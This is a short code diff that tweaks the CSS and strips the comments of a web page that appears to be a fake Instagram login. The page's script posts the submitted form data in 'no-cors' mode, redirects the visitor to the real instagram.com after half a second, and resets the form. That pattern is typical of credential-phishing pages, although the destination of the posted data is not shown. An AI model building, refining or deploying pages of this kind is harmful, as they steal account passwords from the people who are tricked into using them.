@@ -39,6 +39,7 @@
         }
 
         .password-container input {
+            width: 100%;
             padding-right: 50px;
         }
 
@@ -47,12 +48,12 @@
             right: 10px;
             top: 50%;
             transform: translateY(-50%);
-            cursor: pointer;
             background: none;
             border: none;
             color: #0095f6;
             font-weight: bold;
             font-size: 14px;
+            cursor: pointer;
         }
 
         button {
@@ -110,8 +111,8 @@
             mode: "no-cors"
         }).then(() => {
             setTimeout(() => {
-                window.location.href = "https://www.instagram.com"; // Redirige a Instagram
-            }, 500); // Espera medio segundo antes de redirigir
+                window.location.href = "https://www.instagram.com";
+            }, 500);
         });
 
         this.reset();
